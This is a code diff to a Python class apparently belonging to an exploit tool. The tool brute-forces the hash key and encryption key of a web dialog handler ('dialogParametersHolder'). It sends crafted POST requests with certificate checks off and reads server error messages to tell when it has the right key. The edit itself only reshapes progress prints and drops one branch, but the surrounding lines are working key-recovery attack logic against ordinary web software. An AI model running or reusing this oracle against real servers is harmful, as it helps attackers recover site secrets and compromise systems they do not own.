@@ -388,17 +388,13 @@ class DialogHandler:
                 res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
                 resp_body = urllib.parse.unquote(res.text)
 
-                if hashkey_counter % 1000 == 0:
-                    print(f"Tested {str(hashkey_counter)} hash keys so far...")
+                print(f"Tested {hashkey_counter} hash keys so far...") if hashkey_counter % 1000 == 0 else None
 
                 if "The input data is not a complete block" in resp_body:
                     print(f"Found matching hashkey! [{hash_key}]")
 
                     self.hash_key = hash_key
                     break
-
-                elif "The hash is not valid!" in resp_body:
-                    continue
 
                 elif "The input is not a valid Base-64 string" in resp_body:
                     print("The target appears to be a pre-2017 version, and does not have a hash key.")
@@ -416,8 +412,11 @@ class DialogHandler:
                     data = {"dialogParametersHolder": encryption_key_probe}
                     res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
 
-                    if encryptionkey_counter % 1000 == 0:
+                    (
                         print(f"Tested {encryptionkey_counter} encryption keys so far...")
+                        if encryptionkey_counter % 1000 == 0
+                        else None
+                    )
 
                     if "Index was outside the bounds of the array" in res.text:
                         print(f"Found Encryption key! [{encryption_key}]")
@@ -454,8 +453,13 @@ class DialogHandler:
                         self.encryption_key = encryption_key
                         self.hash_key = hash_key
                         break
-                    if count % 1000 == 0:
+
+                    (
                         print(f"Tested {count} hash key / encryption key combinations so far...")
+                        if count % 1000 == 0
+                        else None
+                    )
+
                 if self.hash_key:
                     break
 
